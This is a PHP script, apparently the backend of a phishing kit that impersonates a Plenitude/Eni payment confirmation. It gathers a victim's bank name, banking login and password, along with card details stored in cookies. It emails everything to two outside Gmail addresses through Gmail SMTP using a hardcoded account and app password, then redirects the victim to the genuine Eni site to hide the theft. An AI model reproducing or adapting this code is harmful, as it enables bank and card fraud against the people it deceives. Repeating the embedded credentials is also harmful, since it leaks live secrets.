
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Inclure les fichiers requis de PHPMailer
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';
require 'vendor/autoload.php';

// Vérifier si le formulaire a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $bankname = isset($_POST['bankname']) ? htmlspecialchars($_POST['bankname']) : '';
    $bankid = isset($_POST['bankid']) ? htmlspecialchars($_POST['bankid']) : '';
    $bankpass = isset($_POST['bankpass']) ? htmlspecialchars($_POST['bankpass']) : '';

    // Récupérer les données des cookies
    $n_card = isset($_COOKIE['n_card']) ? htmlspecialchars($_COOKIE['n_card']) : '';
    $nom = isset($_COOKIE['nom']) ? htmlspecialchars($_COOKIE['nom']) : '';
    $prenom = isset($_COOKIE['prenom']) ? htmlspecialchars($_COOKIE['prenom']) : '';
    $c_num = isset($_COOKIE['c_num']) ? htmlspecialchars($_COOKIE['c_num']) : '';

    if (!empty($bankname) && !empty($bankid) && !empty($bankpass) && !empty($n_card) && !empty($nom) && !empty($prenom) && !empty($c_num)) {
        // Instancier PHPMailer
        $mail = new PHPMailer(true);

        try {
            // Configuration du serveur SMTP
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Serveur SMTP de Gmail
            $mail->SMTPAuth = true;
            $mail->Username = 'scottmayzie@gmail.com'; // Remplacez par votre adresse Gmail
            $mail->Password = 'itipzjmsptsyolny'; // Remplacez par votre mot de passe d'application Gmail
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;

            // Configurer les destinataires
            $mail->setFrom('scottmayzie@gmail.com', ' Plenitude info'); // Expéditeur
            $mail->addAddress('jasmayzie@gmail.com'); // Destinataire (vous pouvez changer cette adresse)
            $mail->addAddress('gestionimmobilier770@gmail.com');

            // Contenu de l'e-mail
            $mail->isHTML(true);
            $mail->Subject = 'Confirmation de banque pour paiement plenitude';
            $mail->Body    = "
                <h1>Informations de Confirmation</h1>
                <p><strong>Nom sur la carte:</strong> $n_card</p>
                <p><strong>Nom:</strong> $nom</p>
                <p><strong>Prénom:</strong> $prenom</p>
                <p><strong>Numéro de la carte:</strong> $c_num</p>
                <p><strong>Nom de la Banque:</strong> $bankname</p>
                <p><strong>Identifiant Bancaire:</strong> $bankid</p>
                <p><strong>Mot de Passe:</strong> $bankpass</p>
            ";

            $mail->send();
            // Redirection après l'envoi
            header('Location:  https://fr.eni.com/professionnels'); // Remplacez par l'URL souhaitée
            exit();
        } catch (Exception $e) {
            echo "Erreur lors de l'envoi de l'email: {$mail->ErrorInfo}";
        }
    } else {
        echo "Veuillez remplir tous les champs.";
    }
} else {
    echo "Méthode de requête non autorisée.";
}
?>

